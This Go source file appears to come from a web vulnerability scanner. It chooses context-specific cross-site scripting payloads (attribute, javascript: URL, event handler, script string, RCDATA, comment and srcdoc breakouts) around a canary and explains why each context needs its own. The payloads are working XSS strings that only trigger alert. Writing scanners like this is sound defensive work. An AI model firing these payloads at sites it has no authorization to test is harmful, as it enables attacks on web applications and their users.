// xss_payloads.go chooses which breakout to send, given where the value was observed to land.
//
// The check that uses this sends a bare canary first and classifies the result, because context
// decides exploitability and no single payload spans the contexts. Three of the cases
// cmd/xsschallenge measured as misses are missed for the same structural reason: their exploits
// contain no quote character at all, so a payload built around closing a quote could not have
// produced evidence in them no matter how the response was searched.
//
//   - an unquoted attribute value needs only a space and a new attribute
//   - a `javascript:` URL needs the scheme, and opens no tag at all
//   - an `srcdoc` value is HTML-encoded in the response and decoded back into markup by the
//     attribute parser, so the encoded form IS the exploit
package scanner

// xssPayload is one breakout attempt: a way to build the payload around a fresh canary, and a note
// naming the context it targets so evidence can say what was attempted.
type xssPayload struct {
	build func(canary string) string
	note  string
}

// xssPayloadsForContexts returns the breakouts worth sending for the observed contexts, most
// specific first, with duplicates removed.
//
// An empty or unclassifiable context list falls back to the generic pair — a tag breakout and a
// single-quoted string breakout. That is what the check sent unconditionally before, so a point
// whose context cannot be read is no worse served than it used to be.
func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
	if len(contexts) == 0 {
		return genericXSSPayloads()
	}

	var out []xssPayload
	seen := map[string]bool{}
	add := func(p xssPayload) {
		if seen[p.note] {
			return
		}
		seen[p.note] = true
		out = append(out, p)
	}

	for _, c := range contexts {
		switch c.Kind {
		case xssCtxText:
			add(xssPayload{build: htmlBreakoutPayload, note: "tag injection in a text node"})

		case xssCtxAttrValue:
			switch {
			case c.IsHTMLAttr():
				// srcdoc's value is unescaped back into markup before the inner document is
				// parsed, so the payload does not need to survive as raw markup in the response —
				// it needs to survive as an ENCODED attribute value, which is the opposite of what
				// every other context asks for and why substring matching on raw markup missed it.
				add(xssPayload{build: srcdocBreakoutPayload, note: "markup via an HTML-valued attribute (srcdoc)"})
			case c.IsURLAttr():
				// The scheme is the exploit. No tag is opened and no quote is needed, so a
				// quote-closing payload produces nothing here.
				add(xssPayload{build: javascriptURLPayload, note: "javascript: scheme in a URL-valued attribute"})
			case c.IsEventAttr():
				// The value is already JavaScript; it needs no breakout at all, only an expression.
				add(xssPayload{build: eventHandlerPayload, note: "expression in an inline event handler"})
			case c.Quote == 0:
				// An unquoted value ends at the first space, so a space and an event-handler
				// attribute inject onto the element that is already there. Nothing needs closing,
				// which is exactly why no quote-based marker could ever appear.
				add(xssPayload{build: unquotedAttrPayload, note: "attribute injection into an unquoted value"})
			default:
				quote := c.Quote
				add(xssPayload{
					build: func(canary string) string { return quotedAttrBreakoutPayload(quote, canary) },
					note:  "tag breakout from a quoted attribute value",
				})
			}

		case xssCtxScript:
			// Inside script the canary is already JavaScript; the only question is which literal
			// encloses it, and that is a fact the JS lexer establishes rather than something to
			// guess. c.Quote carries it when the lexer could place the canary; a zero value means
			// it could not, and then both quote styles are tried rather than one being assumed.
			//
			// The escape-the-escaper form is sent alongside the plain one because it defeats a
			// host that escapes quotes but not backslashes, and costs one request.
			for _, q := range scriptHostQuotes(c) {
				quote := q
				add(xssPayload{
					build: func(canary string) string { return scriptBreakoutPayloadFor(quote, canary) },
					note:  "JavaScript string breakout (" + string(quote) + "-quoted host)",
				})
				add(xssPayload{
					build: func(canary string) string { return scriptBreakoutPayloadEscaped(quote, canary) },
					note:  "JavaScript string breakout against a quote-escaping " + string(quote) + "-quoted host",
				})
			}

		case xssCtxRCDATA:
			// `<` is literal inside title/textarea; only the element's own end tag closes it, so
			// the payload has to emit that end tag before any markup can begin.
			tag := c.TagName
			add(xssPayload{
				build: func(canary string) string { return rcdataBreakoutPayload(tag, canary) },
				note:  "markup after closing an RCDATA element",
			})

		case xssCtxComment:
			add(xssPayload{build: commentBreakoutPayload, note: "markup after closing a comment"})
		}
	}

	if len(out) == 0 {
		return genericXSSPayloads()
	}
	return out
}

// genericXSSPayloads is the fallback when nothing could be classified: what the check sent
// unconditionally before this file existed.
func genericXSSPayloads() []xssPayload {
	return []xssPayload{
		{build: htmlBreakoutPayload, note: "tag breakout"},
		{build: func(c string) string { return scriptBreakoutPayloadFor('\'', c) }, note: "JavaScript string breakout"},
		{build: func(c string) string { return scriptBreakoutPayloadFor('"', c) }, note: "JavaScript string breakout (double-quoted host)"},
	}
}

// scriptHostQuotes returns the quote styles worth attacking for a script-context occurrence:
// the one the lexer actually found, or both when it could not place the canary.
//
// Trying both is one extra request and is the honest answer to "we do not know". Assuming one
// would silently skip every host using the other, which is the shape of failure this whole file
// exists to remove.
func scriptHostQuotes(c xssContext) []byte {
	switch c.Quote {
	case '\'', '"':
		return []byte{c.Quote}
	}
	return []byte{'\'', '"'}
}

// quotedAttrBreakoutPayload closes a quoted attribute value and its tag, then opens an element
// that proves execution. The quote has to match the one that opened the value: closing a
// double-quoted value with a single quote does nothing.
func quotedAttrBreakoutPayload(quote byte, canary string) string {
	q := `"`
	if quote == '\'' {
		q = `'`
	}
	return q + `><svg id=` + canary + ` onload=alert(1)>`
}

// unquotedAttrPayload injects a new attribute onto the element already being parsed. An unquoted
// value terminates at whitespace, so no quote is involved anywhere — which is why this case is
// invisible to a quote-closing payload and to any marker built from one.
func unquotedAttrPayload(canary string) string {
	return canary + ` onload=alert(1) id=` + canary
}

// javascriptURLPayload puts an executable scheme in a URL-valued attribute. It must sit at the
// START of the value to be the scheme, so unlike every other payload here it does not prefix
// anything to close a construct.
func javascriptURLPayload(canary string) string {
	return `javascript:alert(` + canary + `)`
}

// eventHandlerPayload is an expression for a context that is already JavaScript.
func eventHandlerPayload(canary string) string {
	return `alert(` + canary + `)`
}

// srcdocBreakoutPayload is markup in the HTML-encoded form srcdoc takes. The attribute parser
// decodes it back into markup before parsing the inner document, so the encoded text is the live
// payload — a response that shows only the encoded form is not evidence of safety here, which is
// the inversion that makes this case defeat an encoding check.
func srcdocBreakoutPayload(canary string) string {
	return `&lt;svg id=` + canary + ` onload=alert(1)&gt;`
}

// rcdataBreakoutPayload closes the RCDATA element first, since `<` is literal inside it.
func rcdataBreakoutPayload(tag, canary string) string {
	if tag == "" {
		tag = "textarea"
	}
	return `</` + tag + `><svg id=` + canary + ` onload=alert(1)>`
}

// commentBreakoutPayload closes the comment before opening an element.
func commentBreakoutPayload(canary string) string {
	return `--><svg id=` + canary + ` onload=alert(1)>`
}
